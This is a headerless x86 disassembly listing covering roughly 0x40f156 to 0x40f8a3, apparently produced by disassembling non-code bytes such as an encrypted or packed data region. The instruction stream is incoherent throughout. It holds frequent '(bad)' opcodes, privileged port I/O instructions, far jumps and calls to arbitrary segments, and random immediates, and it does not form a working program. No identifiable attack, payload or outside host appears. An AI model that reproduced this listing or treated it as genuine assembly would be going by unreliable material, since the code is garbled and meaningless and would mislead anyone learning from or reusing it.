  40f156:	cmp    edx,DWORD PTR [edx-0x4]
  40f159:	adc    ecx,DWORD PTR [esp+eax*1]
  40f15c:	jmp    0x40f0f2
  40f15e:	dec    esi
  40f15f:	xchg   ebp,eax
  40f160:	lock addr16 popa 
  40f163:	sbb    BYTE PTR [esi+0x4154162a],ch
  40f169:	retf   
  40f16a:	popa   
  40f16b:	test   BYTE PTR [edx+eax*2],0xa9
  40f16f:	mov    ds,WORD PTR [ebp+0x5e8c3c69]
  40f175:	jecxz  0x40f15b
  40f177:	scas   eax,DWORD PTR es:[edi]
  40f178:	sub    DWORD PTR [ecx+0xe6d7a80],esp
  40f17e:	loopne 0x40f14a
  40f180:	push   ecx
  40f181:	scas   al,BYTE PTR es:[edi]
  40f182:	out    dx,al
  40f183:	jg     0x40f1e8
  40f185:	sub    dl,BYTE PTR [ecx+0x72]
  40f188:	inc    edi
  40f189:	in     al,dx
  40f18a:	sub    dl,dl
  40f18c:	imul   ebx,DWORD PTR [edx+eiz*4-0x48],0xffffffe3
  40f191:	mov    esp,0xcacfbef8
  40f196:	xchg   edx,eax
  40f197:	push   es
  40f198:	lahf   
  40f199:	(bad)  
  40f19a:	push   eax
  40f19b:	jmp    0xd9:0xcc875ba0
  40f1a2:	(bad)  
  40f1a3:	pop    edi
  40f1a4:	cld    
  40f1a5:	fbld   TBYTE PTR [eax]
  40f1a7:	aad    0xab
  40f1a9:	mov    bl,0x6e
  40f1ab:	and    BYTE PTR [ebx+ebp*2-0x3d],ch
  40f1af:	mov    ch,0xd4
  40f1b1:	int3   
  40f1b2:	(bad)  
  40f1b3:	xor    esp,DWORD PTR [edi+0x62]
  40f1b6:	inc    esp
  40f1b7:	mov    BYTE PTR [ecx+0x13],cl
  40f1ba:	jbe    0x40f203
  40f1bc:	mov    edi,0x50f1b203
  40f1c1:	daa    
  40f1c2:	stc    
  40f1c3:	inc    esi
  40f1c4:	cmp    al,BYTE PTR [esi]
  40f1c6:	add    BYTE PTR [ebx+edx*4+0x5d],ah
  40f1ca:	dec    ebx
  40f1cb:	(bad)  
  40f1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1cd:	mov    bh,0xd5
  40f1cf:	repz rcl DWORD PTR ds:0xfcfbc2b0,cl
  40f1d6:	jmp    0x84529eb8
  40f1db:	icebp  
  40f1dc:	sub    eax,0xd9903dee
  40f1e1:	or     bh,cl
  40f1e3:	in     al,0xa3
  40f1e5:	dec    esp
  40f1e6:	dec    eax
  40f1e7:	stos   DWORD PTR es:[edi],eax
  40f1e8:	retf   
  40f1e9:	xor    ebp,DWORD PTR [edx+0x24e756c8]
  40f1ef:	jmp    0x19d7:0x6e4afb8f
  40f1f6:	(bad)  
  40f1f7:	int    0x94
  40f1f9:	outs   dx,BYTE PTR ds:[esi]
  40f1fa:	cs sub eax,edi
  40f1fd:	push   ebx
  40f1fe:	ins    DWORD PTR es:[edi],dx
  40f1ff:	and    al,0xcf
  40f201:	mov    cl,0x8a
  40f203:	jbe    0x40f1bf
  40f205:	pop    ebp
  40f206:	mov    edx,0x18039a1f
  40f20b:	popf   
  40f20c:	rol    BYTE PTR [ecx+0x10],cl
  40f20f:	sbb    edx,0x9187d843
  40f215:	popf   
  40f216:	scas   eax,DWORD PTR es:[edi]
  40f217:	pop    ss
  40f218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f219:	(bad)  
  40f21a:	lods   eax,DWORD PTR ds:[esi]
  40f21b:	jo     0x40f20d
  40f21d:	inc    esi
  40f21e:	out    0x1b,al
  40f220:	enter  0xa713,0x9b
  40f224:	gs mov dh,0x49
  40f227:	inc    edi
  40f228:	mov    edx,0x83c2b024
  40f22d:	push   ds
  40f22e:	and    esi,DWORD PTR fs:[esi]
  40f231:	lea    ecx,[edi]
  40f233:	add    al,0xd2
  40f235:	iret   
  40f236:	adc    BYTE PTR [edi-0x6d],bl
  40f239:	test   DWORD PTR [ebx+ebx*4-0x781971a3],0x4ce62a6e
  40f244:	sbb    ch,BYTE PTR ds:0x79628db5
  40f24a:	pusha  
  40f24b:	dec    ecx
  40f24c:	imul   esp,DWORD PTR [esi+0x2],0xab47fc17
  40f253:	cld    
  40f254:	or     ebp,0xffffffdb
  40f257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f258:	sub    bl,BYTE PTR [edi+0x65]
  40f25b:	mov    ah,0xd3
  40f25d:	sbb    al,0xb3
  40f25f:	loope  0x40f2e0
  40f261:	cld    
  40f262:	fdivr  QWORD PTR ds:0xdcbe0650
  40f268:	add    ch,dl
  40f26a:	sbb    dl,bh
  40f26c:	scas   eax,DWORD PTR es:[edi]
  40f26d:	xor    eax,0xb124c1fc
  40f272:	mov    esi,0x1053782d
  40f277:	shr    DWORD PTR [ebx+esi*1],cl
  40f27a:	inc    esi
  40f27b:	mov    bl,0xd
  40f27d:	(bad)
  40f281:	fnsave [edx+0x17]
  40f284:	inc    DWORD PTR [ebx-0x1f]
  40f287:	(bad)
  40f28a:	xchg   DWORD PTR [eax],esi
  40f28c:	mov    dl,0x91
  40f28e:	inc    edx
  40f28f:	cmp    al,ah
  40f291:	adc    ah,BYTE PTR [ecx+0x71b9d7d9]
  40f297:	cmp    ch,BYTE PTR [edx-0x6bf7c565]
  40f29d:	int3   
  40f29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f29f:	push   es
  40f2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a1:	cmp    edx,DWORD PTR [edi]
  40f2a3:	fdivrp st(4),st
  40f2a5:	shl    DWORD PTR [edx+eax*1],1
  40f2a8:	or     al,0xb8
  40f2aa:	jle    0x40f2eb
  40f2ac:	xchg   ebx,eax
  40f2ad:	fwait
  40f2ae:	xchg   ebp,eax
  40f2af:	mov    dl,0x43
  40f2b1:	rol    ch,1
  40f2b3:	inc    ebp
  40f2b4:	mov    eax,ds:0xb6117f7b
  40f2b9:	sti    
  40f2ba:	je     0x40f334
  40f2bc:	stc    
  40f2bd:	xchg   ebp,eax
  40f2be:	mov    al,0xfd
  40f2c0:	jmp    0x40f24e
  40f2c2:	mov    fs,WORD PTR [edx+0xfa888d4]
  40f2c8:	xchg   ebx,ebp
  40f2ca:	or     al,0x3c
  40f2cc:	stc    
  40f2cd:	cwde   
  40f2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d0:	jne    0x40f25a
  40f2d2:	sub    DWORD PTR [ebp-0x25aa1292],ecx
  40f2d8:	jbe    0x40f27b
  40f2da:	loope  0x40f2b2
  40f2dc:	cmp    DWORD PTR [edi+edi*2-0x34a9de61],edi
  40f2e3:	adc    cl,0xc1
  40f2e6:	add    BYTE PTR [ecx-0x2dff5c54],cl
  40f2ec:	xchg   ebx,eax
  40f2ed:	dec    edi
  40f2ee:	cmp    BYTE PTR [ebx+0x32],bh
  40f2f1:	addr16 std 
  40f2f3:	push   ebp
  40f2f4:	lea    edi,[esi]
  40f2f6:	inc    ebx
  40f2f7:	push   edx
  40f2f8:	jae    0x40f34c
  40f2fa:	jno    0x40f2bf
  40f2fc:	push   es
  40f2fd:	mov    eax,0xfc683b9a
  40f302:	icebp  
  40f303:	jmp    0x40f2da
  40f305:	jnp    0x40f312
  40f307:	jl     0x40f2c8
  40f309:	inc    eax
  40f30a:	adc    esi,edi
  40f30c:	in     al,0xdb
  40f30e:	and    BYTE PTR [ebx-0x2f],bh
  40f311:	sub    ebp,DWORD PTR [eax+0x3e07ffe5]
  40f317:	inc    esp
  40f318:	scas   eax,DWORD PTR es:[edi]
  40f319:	jo     0x40f33d
  40f31b:	std    
  40f31c:	push   0xf6ba8ec5
  40f321:	cmp    BYTE PTR [ebx+0x8177951],dl
  40f327:	js     0x40f327
  40f329:	arpl   dx,sp
  40f32b:	and    edx,DWORD PTR [esi-0x20]
  40f32e:	sub    BYTE PTR [ebx],0x75
  40f331:	fdiv   DWORD PTR [ebx+edx*4]
  40f334:	fstp   TBYTE PTR [ebx+esi*1+0x5044e979]
  40f33b:	add    BYTE PTR [ecx],bh
  40f33d:	stc    
  40f33e:	dec    esp
  40f33f:	xchg   ebp,eax
  40f340:	fcom   QWORD PTR [esi-0x6f500ce8]
  40f346:	jo     0x40f37c
  40f348:	cdq    
  40f349:	push   edi
  40f34a:	jae    0x40f369
  40f34c:	cli    
  40f34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34e:	xchg   edx,eax
  40f34f:	adc    edi,eax
  40f351:	out    0x36,eax
  40f353:	jmp    0x40f324
  40f355:	cdq    
  40f356:	psubw  mm0,QWORD PTR [ebp+0x3f]
  40f35a:	and    eax,0x52e51e92
  40f35f:	push   0x5e
  40f361:	int3   
  40f362:	cmp    eax,0xc1d16861
  40f367:	pop    edi
  40f368:	xchg   edi,eax
  40f369:	mov    dh,0x83
  40f36b:	cmp    ecx,DWORD PTR [esi+0x355804b8]
  40f371:	or     eax,0xb2f53209
  40f376:	cdq    
  40f377:	mov    WORD PTR [edx-0x3e72156c],cs
  40f37d:	inc    esp
  40f37e:	add    eax,0x464f154d
  40f383:	sbb    eax,0x7d5fd840
  40f388:	lock xor ah,BYTE PTR [esi-0x36dd5a9e]
  40f38f:	outs   dx,DWORD PTR ds:[esi]
  40f390:	loope  0x40f346
  40f392:	test   DWORD PTR [ecx],ebp
  40f394:	adc    DWORD PTR ds:0x6f39f3df,eax
  40f39a:	das    
  40f39b:	mov    esi,0x7a7b47d3
  40f3a0:	pusha  
  40f3a1:	out    0x10,eax
  40f3a3:	and    ah,BYTE PTR [ebp*2-0x5cfeaa03]
  40f3aa:	pop    edi
  40f3ab:	outs   dx,DWORD PTR fs:[esi]
  40f3ad:	sbb    ebx,DWORD PTR [ebx]
  40f3af:	sub    eax,0xef2c82bb
  40f3b4:	push   esi
  40f3b5:	scas   al,BYTE PTR es:[edi]
  40f3b6:	dec    ebx
  40f3b7:	cmp    al,0xb6
  40f3b9:	and    eax,0x91bc19e1
  40f3be:	or     BYTE PTR [edx-0x17],cl
  40f3c1:	ss cwde 
  40f3c3:	mov    eax,0x5358095a
  40f3c8:	dec    ebx
  40f3c9:	push   eax
  40f3ca:	mov    dl,0x83
  40f3cc:	adc    edi,DWORD PTR [edi-0x63]
  40f3cf:	outs   dx,DWORD PTR ds:[esi]
  40f3d0:	mov    al,0x79
  40f3d2:	daa    
  40f3d3:	in     al,0x36
  40f3d5:	push   edx
  40f3d6:	inc    edx
  40f3d7:	(bad)  
  40f3d8:	mov    esp,0x73e2c354
  40f3dd:	and    ebx,edi
  40f3df:	jns    0x40f3ce
  40f3e1:	adc    al,0x37
  40f3e3:	bound  ecx,QWORD PTR [esi+esi*1-0xd17786e]
  40f3ea:	loop   0x40f43c
  40f3ec:	xor    eax,0xd3aecb5
  40f3f1:	cmp    ebp,eax
  40f3f3:	and    al,bl
  40f3f5:	and    bh,ch
  40f3f7:	xor    eax,0x64c457ab
  40f3fc:	mov    dl,0x53
  40f3fe:	rcr    BYTE PTR [eax+0x31],0xf1
  40f402:	js     0x40f44b
  40f404:	mov    BYTE PTR [edx+0x6f937d1f],al
  40f40a:	push   es
  40f40b:	adc    BYTE PTR [edi-0x45e08d46],bl
  40f411:	mov    ss,ebp
  40f413:	int3   
  40f414:	mov    dl,0x58
  40f416:	iret   
  40f417:	popa   
  40f418:	cmp    eax,0x232c4bb2
  40f41d:	sub    bh,ch
  40f41f:	push   ss
  40f420:	mov    eax,gs:0x78d8c7fc
  40f426:	ins    DWORD PTR es:[edi],dx
  40f427:	sub    dl,BYTE PTR [eax-0x12]
  40f42a:	test   al,dl
  40f42c:	add    al,BYTE PTR [edi-0x41]
  40f42f:	push   es
  40f430:	cld    
  40f431:	jg     0x40f469
  40f433:	pop    es
  40f434:	push   ebp
  40f435:	ins    DWORD PTR es:[edi],dx
  40f436:	adc    BYTE PTR [eax],al
  40f438:	ret    
  40f439:	sub    al,0x0
  40f43b:	sub    al,BYTE PTR [edi+0x718e20a3]
  40f441:	hlt    
  40f442:	mov    WORD PTR [ebx],es
  40f444:	lea    esi,[edi]
  40f446:	mov    edi,0x37dceb00
  40f44b:	outs   dx,BYTE PTR ds:[esi]
  40f44c:	mov    al,ds:0x77d1b8a7
  40f451:	loopne 0x40f464
  40f453:	add    ebx,DWORD PTR [edx]
  40f455:	and    edx,esi
  40f457:	cmp    BYTE PTR [edx+ebp*4],dh
  40f45a:	inc    esi
  40f45b:	sub    al,cl
  40f45d:	or     eax,0x4ef1aec0
  40f462:	pop    esi
  40f463:	xchg   ecx,eax
  40f464:	add    DWORD PTR [ebx+ebp*2-0x4142a437],0xffffffed
  40f46c:	xchg   edi,eax
  40f46d:	pop    es
  40f46e:	mov    cl,0x7c
  40f470:	stos   BYTE PTR es:[edi],al
  40f471:	retf   
  40f472:	xor    ch,BYTE PTR [esi-0x29]
  40f475:	push   ds
  40f476:	test   DWORD PTR [ecx+eiz*2+0x756d2291],ebp
  40f47d:	test   BYTE PTR es:[ebp+0xa65b843],bh
  40f484:	std    
  40f485:	test   eax,0x6f874af
  40f48a:	pop    ebp
  40f48b:	stos   BYTE PTR es:[edi],al
  40f48c:	call   0xbf75:0x4d5450f3
  40f493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f494:	out    dx,eax
  40f495:	dec    BYTE PTR [ecx-0x20]
  40f498:	shl    BYTE PTR [esi+0x4546c0cb],0xa7
  40f49f:	cs test eax,0xce78a0bf
  40f4a5:	fiadd  DWORD PTR [ecx]
  40f4a7:	cmp    BYTE PTR [esi+0x5dc1887],bl
  40f4ad:	push   edx
  40f4ae:	cmp    ecx,DWORD PTR [ebp-0x10]
  40f4b1:	aad    0xa
  40f4b3:	sub    dl,dh
  40f4b5:	out    0xa6,al
  40f4b7:	jno    0x40f4b8
  40f4b9:	dec    edi
  40f4ba:	cmp    eax,0x6e2228df
  40f4bf:	or     esp,ebp
  40f4c1:	xchg   esi,eax
  40f4c2:	push   esp
  40f4c3:	inc    ecx
  40f4c4:	pop    eax
  40f4c5:	inc    esi
  40f4c6:	xchg   edx,eax
  40f4c7:	push   ebx
  40f4c8:	lahf   
  40f4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4ca:	(bad)  
  40f4cb:	pop    ebp
  40f4cc:	jo     0x40f468
  40f4ce:	aam    0xe0
  40f4d0:	and    al,0xb0
  40f4d2:	mov    bl,0x8a
  40f4d4:	push   ebp
  40f4d5:	repz sahf 
  40f4d7:	not    BYTE PTR [ebx]
  40f4d9:	imul   ebp,DWORD PTR [ebp+0x459dd260],0xa
  40f4e0:	push   es
  40f4e1:	dec    ecx
  40f4e2:	cmp    DWORD PTR [edx-0x41abff8b],ebx
  40f4e8:	in     al,dx
  40f4e9:	inc    edi
  40f4ea:	scas   eax,DWORD PTR es:[edi]
  40f4eb:	or     bh,al
  40f4ed:	push   eax
  40f4ee:	into   
  40f4ef:	and    cl,dl
  40f4f1:	add    al,BYTE PTR [edi-0x20d9d796]
  40f4f7:	rol    esp,cl
  40f4f9:	mul    BYTE PTR [ecx]
  40f4fb:	imul   esi,ebp,0xf86ada26
  40f501:	push   edx
  40f502:	pop    edi
  40f503:	mov    al,0xd2
  40f505:	cmp    cl,BYTE PTR [ebx+edx*4]
  40f508:	xor    eax,0x2304c4e7
  40f50d:	lds    edi,FWORD PTR [eax+edi*1+0x7ada0f18]
  40f514:	aad    0x7e
  40f516:	(bad)  
  40f517:	pop    ecx
  40f518:	mov    al,BYTE PTR [edx]
  40f51a:	mov    eax,0x43ea35d6
  40f51f:	(bad)  
  40f520:	ja     0x40f510
  40f522:	xor    bl,dh
  40f524:	jne    0x40f59c
  40f526:	jl     0x40f523
  40f528:	push   ebx
  40f529:	inc    edx
  40f52a:	or     eax,0xdffb2bf2
  40f52f:	cmc    
  40f530:	cmp    edx,ecx
  40f532:	out    dx,eax
  40f533:	xchg   esi,eax
  40f534:	or     DWORD PTR [edx+0x48],ecx
  40f537:	loopne 0x40f537
  40f539:	xchg   edi,eax
  40f53a:	mov    ah,0x4
  40f53c:	imul   edx,esp,0xffffff8f
  40f53f:	xor    eax,0xa4bca06d
  40f544:	jecxz  0x40f526
  40f546:	es pop ss
  40f548:	rcr    DWORD PTR [edi+0x6f],0x3e
  40f54c:	and    dh,BYTE PTR [eax+eax*2+0x76]
  40f550:	cs xor dl,ch
  40f553:	(bad)  
  40f554:	in     eax,0x70
  40f556:	jnp    0x40f58a
  40f558:	mov    edx,0x2c9c799a
  40f55d:	and    eax,0x1a568592
  40f562:	and    eax,0x669a23c4
  40f567:	lods   eax,DWORD PTR ds:[esi]
  40f568:	jl     0x40f599
  40f56a:	mov    WORD PTR [edx+0x2bbda3a3],ds
  40f570:	and    DWORD PTR [ebx-0x6c],eax
  40f573:	jge    0x40f5a9
  40f575:	sub    dl,cl
  40f577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f578:	cmp    ch,BYTE PTR [esi+0x48feb258]
  40f57e:	or     ah,dh
  40f580:	in     al,0x2c
  40f582:	cmp    al,0x6a
  40f584:	dec    edi
  40f585:	(bad)  
  40f587:	scas   eax,DWORD PTR es:[edi]
  40f588:	jnp    0x40f577
  40f58a:	xchg   esp,eax
  40f58b:	jmp    0x8397bf4f
  40f590:	rcr    BYTE PTR [ecx],cl
  40f592:	push   edi
  40f593:	loope  0x40f540
  40f595:	out    0x63,eax
  40f597:	adc    al,0x67
  40f599:	add    ebp,DWORD PTR [edx-0x2]
  40f59c:	push   eax
  40f59d:	push   ebp
  40f59e:	xchg   ecx,eax
  40f59f:	in     al,0xf7
  40f5a1:	push   0x6c
  40f5a3:	jne    0x40f5d0
  40f5a5:	shrd   DWORD PTR [ebx],ebp,cl
  40f5a8:	icebp  
  40f5a9:	cmp    esp,DWORD PTR [ebx]
  40f5ab:	push   ebx
  40f5ac:	cmc    
  40f5ad:	and    ebx,DWORD PTR [esi-0x6ff0bd8f]
  40f5b3:	inc    esi
  40f5b4:	and    DWORD PTR [edi+edx*4+0xd],eax
  40f5b8:	imul   ebx,edx,0x6042491c
  40f5be:	fisttp WORD PTR [esi-0x7d529673]
  40f5c4:	scas   al,BYTE PTR es:[edi]
  40f5c5:	and    al,BYTE PTR [eax+0x36]
  40f5c8:	push   esi
  40f5c9:	out    dx,al
  40f5ca:	push   DWORD PTR [esi]
  40f5cc:	daa    
  40f5cd:	cmp    al,0x4b
  40f5cf:	push   ss
  40f5d0:	or     al,0x43
  40f5d2:	ret    0x2ad2
  40f5d5:	(bad)  
  40f5d6:	adc    DWORD PTR [esi-0x36],ebx
  40f5d9:	lea    ebx,ds:0xec094deb
  40f5df:	xor    DWORD PTR [ebx],ecx
  40f5e1:	shl    DWORD PTR [eax+0x156a990d],1
  40f5e7:	scas   al,BYTE PTR es:[edi]
  40f5e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e9:	adc    eax,0x4ab3f852
  40f5ee:	and    bl,BYTE PTR [eax+0x21]
  40f5f1:	call   0xd4084baa
  40f5f6:	cmp    al,0x4e
  40f5f8:	mov    bh,0x5b
  40f5fa:	out    dx,eax
  40f5fb:	xor    al,0xec
  40f5fd:	(bad)  
  40f5fe:	sbb    ch,BYTE PTR [ebx]
  40f600:	inc    esp
  40f601:	les    esp,FWORD PTR ds:0x8734e447
  40f607:	jae    0x40f630
  40f609:	dec    ecx
  40f60a:	cdq    
  40f60b:	lods   eax,DWORD PTR ds:[esi]
  40f60c:	push   ss
  40f60d:	mov    eax,ds:0x22676851
  40f612:	jo     0x40f60f
  40f614:	aad    0xa1
  40f616:	mov    ecx,0x1718bf1
  40f61b:	das    
  40f61c:	ret    0xa5fc
  40f61f:	mov    edx,0x67060dfd
  40f624:	popfw  
  40f626:	stos   DWORD PTR es:[edi],eax
  40f627:	and    edx,DWORD PTR [ecx+0x733b6dc4]
  40f62d:	adc    BYTE PTR [eax],bl
  40f62f:	fistp  QWORD PTR ds:0x42f3e3d9
  40f635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f636:	inc    ebx
  40f637:	out    dx,eax
  40f638:	sbb    eax,DWORD PTR [eax+0x51]
  40f63b:	(bad)  
  40f63c:	pop    ebp
  40f63d:	fisttp DWORD PTR [edi-0x5c]
  40f640:	dec    esp
  40f641:	loope  0x40f602
  40f643:	add    DWORD PTR [edx],edi
  40f645:	out    0x39,eax
  40f647:	sub    esp,DWORD PTR [eax]
  40f649:	ja     0x40f6a0
  40f64b:	fbld   TBYTE PTR [edi+0x6ee06630]
  40f651:	mov    eax,DWORD PTR [ebx+0x504bac71]
  40f657:	pop    ebp
  40f658:	lds    ebp,FWORD PTR [edi+0x1e2bb386]
  40f65e:	int3   
  40f65f:	imul   ebx,DWORD PTR [ebx+0x33],0x362cbc0e
  40f666:	fnstenv [ecx]
  40f668:	xor    cl,dh
  40f66a:	repz aam 0x36
  40f66d:	add    edx,ebp
  40f66f:	cwde   
  40f670:	shr    DWORD PTR [edx+esi*8+0x15c66518],1
  40f677:	das    
  40f678:	es aam 0x93
  40f67b:	(bad)  
  40f67c:	sub    BYTE PTR [edx+ecx*4+0x19e66798],0xce
  40f684:	imul   ecx,DWORD PTR [eax+0x16400aa6],0x9ff07d5e
  40f68e:	cmp    ch,al
  40f690:	ins    BYTE PTR es:[edi],dx
  40f691:	adc    ch,BYTE PTR [edi-0x5a281250]
  40f697:	loope  0x40f6a0
  40f699:	mov    eax,0xe21bb952
  40f69e:	retf   
  40f69f:	and    ecx,DWORD PTR [ecx-0x1fe0b77a]
  40f6a5:	test   DWORD PTR [ecx-0x4a],0x1d159369
  40f6ac:	jae    0x40f647
  40f6ae:	or     DWORD PTR [eax-0x76d42c88],ecx
  40f6b4:	add    al,0xd7
  40f6b6:	mov    al,0x64
  40f6b8:	jmp    0x29a02f6f
  40f6bd:	aaa    
  40f6be:	jns    0x40f6f8
  40f6c0:	cli    
  40f6c1:	stc    
  40f6c2:	inc    ebp
  40f6c3:	(bad)  
  40f6c4:	dec    ebx
  40f6c5:	test   cl,ah
  40f6c7:	daa    
  40f6c8:	mov    dl,0xe8
  40f6ca:	and    bh,BYTE PTR [ebx-0x632948a5]
  40f6d0:	adc    BYTE PTR [ecx-0x1e1f358b],bh
  40f6d6:	xchg   esi,eax
  40f6d7:	xor    al,0x1a
  40f6d9:	push   cs
  40f6da:	jo     0x40f6d5
  40f6dc:	mov    esi,0xbf12162b
  40f6e1:	pop    ebx
  40f6e2:	push   ecx
  40f6e3:	fdivr  QWORD PTR [esi-0x2b]
  40f6e6:	pop    ebx
  40f6e7:	jg     0x40f70d
  40f6e9:	mov    ds:0x116b9811,al
  40f6ee:	jmp    0x40f6ab
  40f6f0:	push   cs
  40f6f1:	outs   dx,BYTE PTR ds:[esi]
  40f6f2:	sbb    DWORD PTR [ecx-0x6000dcaa],esp
  40f6f8:	cld    
  40f6f9:	test   DWORD PTR [ebp+0x6f],0x8ab77a30
  40f700:	lods   al,BYTE PTR ds:[esi]
  40f701:	jbe    0x40f69c
  40f703:	mov    WORD PTR ds:0xa2390f83,?
  40f709:	retf   0x2c01
  40f70c:	mov    ch,0xb7
  40f70e:	push   esi
  40f70f:	popf   
  40f710:	jbe    0x40f6a4
  40f712:	into   
  40f713:	fld    QWORD PTR [ecx-0x8]
  40f716:	dec    ebx
  40f717:	icebp  
  40f718:	add    BYTE PTR [ebp+0x7912933],ah
  40f71e:	stos   BYTE PTR es:[edi],al
  40f71f:	xchg   BYTE PTR [edi+0x19e0a5ff],bh
  40f725:	int3   
  40f726:	dec    ebx
  40f727:	setp   BYTE PTR [esi]
  40f72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f72b:	sbb    BYTE PTR [edi],0x65
  40f72e:	or     ch,cl
  40f730:	mov    eax,ds:0x6a9a4ba
  40f735:	jmp    0x4df5:0x1af315a2
  40f73c:	sbb    ebx,DWORD PTR [eax+0x79ec6592]
  40f742:	idiv   cl
  40f744:	jne    0x40f771
  40f746:	adc    BYTE PTR [ebx+ecx*1],dl
  40f749:	jl     0x40f7ba
  40f74b:	das    
  40f74c:	fild   DWORD PTR [eax]
  40f74e:	out    0x27,eax
  40f750:	push   0x3f
  40f752:	lods   al,BYTE PTR ds:[esi]
  40f753:	cmp    BYTE PTR [eax+ebx*4],dh
  40f756:	mov    bl,BYTE PTR [edx+0x51]
  40f759:	call   0xfa92:0x8bee9045
  40f760:	xchg   DWORD PTR [eax],ebx
  40f762:	mov    edi,ebp
  40f764:	ret    0xcd63
  40f767:	jb     0x40f7db
  40f769:	jg     0x40f74d
  40f76b:	mov    edi,0xbdf3a0ee
  40f770:	iret   
  40f771:	dec    ebx
  40f772:	mov    ch,0xe4
  40f774:	sbb    al,0xe7
  40f776:	ret    
  40f777:	adc    DWORD PTR [esi+0x6a],0x22c15b1f
  40f77e:	push   ecx
  40f77f:	or     al,0xef
  40f781:	outs   dx,DWORD PTR ds:[esi]
  40f782:	ss push es
  40f784:	pop    ebx
  40f785:	dec    ebp
  40f786:	(bad)  
  40f787:	adc    al,0x4d
  40f789:	push   0x4371e45e
  40f78e:	ja     0x40f7c7
  40f790:	mov    ds:0x750c7cf5,al
  40f795:	adc    bl,cl
  40f797:	xchg   ebx,eax
  40f798:	push   ds
  40f799:	rcl    BYTE PTR [edi],cl
  40f79b:	loope  0x40f7cf
  40f79d:	sbb    BYTE PTR [ebx-0x64],0x6d
  40f7a1:	repz lock cmp BYTE PTR [ebp+0x51],bl
  40f7a6:	jne    0x40f790
  40f7a8:	arpl   cx,bx
  40f7aa:	out    dx,eax
  40f7ab:	jno    0x40f75c
  40f7ad:	daa    
  40f7ae:	arpl   WORD PTR [eax+0x67dca463],ax
  40f7b4:	cmp    ch,bl
  40f7b6:	shr    ch,cl
  40f7b8:	sub    DWORD PTR [eax+0x5],esp
  40f7bb:	pop    es
  40f7bc:	jnp    0x40f7e1
  40f7be:	ffree  st(3)
  40f7c0:	rcl    BYTE PTR [esi-0x1853956e],1
  40f7c6:	(bad)  
  40f7c7:	scas   eax,DWORD PTR es:[edi]
  40f7c8:	int    0xaa
  40f7ca:	pop    ebp
  40f7cb:	and    cl,BYTE PTR [eax-0x2b112ec4]
  40f7d1:	push   es
  40f7d2:	dec    edi
  40f7d3:	loope  0x40f7cc
  40f7d5:	mov    al,ds:0x7e6e739
  40f7da:	std    
  40f7db:	sahf   
  40f7dc:	gs jge 0x40f7de
  40f7df:	pushf  
  40f7e0:	xor    esp,DWORD PTR fs:[edx]
  40f7e3:	test   BYTE PTR [edi+0x51],0x81
  40f7e7:	stc    
  40f7e8:	xchg   edx,eax
  40f7e9:	dec    edx
  40f7ea:	jmp    0x40f806
  40f7ec:	pop    ecx
  40f7ed:	sahf   
  40f7ee:	xchg   esi,eax
  40f7ef:	or     eax,0x284e5a52
  40f7f4:	inc    ebx
  40f7f5:	adc    ch,BYTE PTR [edx-0x1a]
  40f7f8:	out    0xcd,al
  40f7fa:	sub    dl,dl
  40f7fc:	into   
  40f7fd:	mov    al,0x66
  40f7ff:	aas    
  40f800:	pop    ecx
  40f801:	xchg   ecx,eax
  40f802:	jnp    0x40f87d
  40f804:	and    DWORD PTR [ecx+0x21],esp
  40f807:	fwait
  40f808:	lea    eax,[esi]
  40f80a:	aaa    
  40f80b:	call   0x64f90cb8
  40f810:	xor    eax,DWORD PTR ds:0xe8f38756
  40f816:	mov    dh,0x51
  40f818:	lds    edi,FWORD PTR [esi+0x36]
  40f81b:	test   al,0xbb
  40f81d:	(bad)  
  40f81e:	mov    ecx,0xa1ce99c8
  40f823:	mov    al,ds:0xdc73b519
  40f828:	mov    edi,0xc609d79d
  40f82d:	cli    
  40f82e:	lods   eax,DWORD PTR ds:[esi]
  40f82f:	popa   
  40f830:	loopne 0x40f83d
  40f832:	push   0xffffff87
  40f834:	ror    BYTE PTR [edi+0x18418170],1
  40f83a:	cmp    BYTE PTR [edx+0x25],dh
  40f83d:	and    esi,esp
  40f83f:	push   eax
  40f840:	jecxz  0x40f883
  40f842:	ror    DWORD PTR [esi+0x6],1
  40f845:	sub    DWORD PTR [edx+0x12],edi
  40f848:	jns    0x40f885
  40f84a:	jne    0x40f8b0
  40f84c:	push   0xffffffde
  40f84e:	pop    edx
  40f84f:	int    0x11
  40f851:	or     ebp,DWORD PTR [ebx+0x31]
  40f854:	jns    0x40f8c9
  40f856:	xor    DWORD PTR [ebp-0x457407e2],ecx
  40f85c:	inc    ebx
  40f85d:	adc    edi,DWORD PTR [edx+0x52]
  40f860:	bound  ebx,QWORD PTR [esi+0x1f]
  40f863:	(bad)  
  40f864:	loop   0x40f87d
  40f866:	mov    WORD PTR [edi+0x6f],ss
  40f869:	test   al,0xb0
  40f86b:	add    al,BYTE PTR [ebx-0x37173aff]
  40f871:	ins    BYTE PTR es:[edi],dx
  40f872:	and    DWORD PTR [eax+0x10fa543a],ebx
  40f878:	ret    0xb8a1
  40f87b:	ds add al,0x30
  40f87e:	pop    ebx
  40f87f:	hlt    
  40f880:	jecxz  0x40f8d6
  40f882:	jl     0x40f83d
  40f884:	fincstp 
  40f886:	lea    ebp,[edi+edx*1+0x50d8cc7b]
  40f88d:	mov    BYTE PTR [eax],dh
  40f88f:	lods   eax,DWORD PTR ds:[esi]
  40f890:	std    
  40f891:	adc    eax,DWORD PTR [eax+edi*8]
  40f894:	cmc    
  40f895:	jno    0x40f912
  40f897:	lods   al,BYTE PTR ds:[esi]
  40f898:	mov    bl,0xc1
  40f89a:	ficomp WORD PTR [edx+0x52e0d7f2]
  40f8a0:	cli    
  40f8a1:	jge    0x40f8c5
  40f8a3:	dec    ecx
